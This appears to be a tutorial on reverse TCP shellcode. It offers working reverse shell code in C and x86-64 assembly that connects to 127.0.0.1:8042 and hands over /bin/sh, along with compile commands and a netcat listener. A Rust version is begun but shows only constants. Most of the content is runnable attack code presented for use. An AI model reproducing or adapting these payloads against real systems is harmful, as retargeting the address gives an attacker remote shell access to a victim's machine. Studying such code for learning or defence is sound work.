# Shellcode

# Reverse TCP

The first thing that we should know is that a reverse TCP shellcode establishes a TCP connection to a server, creates a shell into the victim's computer and redirects the STDOUT functions to the TCP, this allows the attacker to have access into the victim's machine.

# C Reverse TCP

This is an example of a reverse shell client written in C: 

```c
#include <sys/types.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <unistd.h>

  void main() {
    
    int sock = socket(AF_INET, SOCK_STREAM, 0);
    
    struct sockaddr_in sin;
    
    sin.sin_family = AF_INET;
    sin.sin_port = htons(8042);
    
    inet_pton(AF_INET, "127.0.0.1", &sin.sin_addr.s_addr);
    connect(sock, (struct sockaddr *)&sin, sizeof(struct sockaddr_in));

    dup2(sock, STDIN_FILENO);
    dup2(sock, STDOUT_FILENO);
    dup2(sock, STDERR_FILENO);

    char *argv[] = {"/bin/sh", NULL};
    execve(argv[0], argv, NULL);
}
```
This is a simple TCP reverse shell working in UNIX systems, for trying it you can just compile and run it, don't forget using a server as NC for accepting the incoming connections.

```sh
gcc main.c -o reversetcp

./reversetcp
```

# Tanslated to ASM

This is the same code but translated to ASM x86_64.

```asm
; Same C code but written in ASM x86-64.
 
xor rdx, rdx
mov rsi, 1
mov rdi, 2
mov rax, 41
syscall

push 0x0100007f ; 127.0.0.1 == 0x7f000001
mov bx, 0x6a1f ; 8042 = 0x1f6a
push bx
mov bx, 0x2
push bx
mov rsi, rsp
mov rdx, 0x10
mov rdi, rax
push rax
mov rax, 42
syscall
pop rdi
mov rsi, 2
mov rax, 0x21
syscall
dec rsi
mov rax, 0x21
syscall
dec rsi
mov rax, 0x21
syscall
push 0x68732f
push 0x6e69622f
mov rdi, rsp
xor rdx, rdx
push rdx
push rdi
mov rsi, rsp
mov rax, 59
syscall
```

This is a good example for why is important to use higher level languajes.

# Final code in Rust

In the Rust code the first thing we have to do is defining our shellcode variables.

```rs
const PORT: u16 = 0x6A1F; // 8042
const IP: u32 = 0x0100007f; // 127.0.0.1

const SYS_DUP2: usize = 33;
const SYS_SOCKET: usize = 41;
const SYS_CONNECT: usize = 42;
const SYS_EXECVE: usize = 59;
const AF_INET: usize = 2;
const SOCK_STREAM: usize = 1;
const IPPROTO_IP: usize = 0;
const STDIN: usize = 0;
const STDOUT: usize = 1;
const STDERR: usize = 2;
```
We also gotta use some structures coded in the C program such as the sockaddr_in structure.
And define the main functions.

# Try and Run

For running the Reverse-TCP client:

```
rustc main.rs
```

And as server we will be using Netcat, preintalled in many Linux systems.

```
nc -vlnp 8042
```

{local_ip}:8042 - You can change the port for receiving the connection in anotherone.
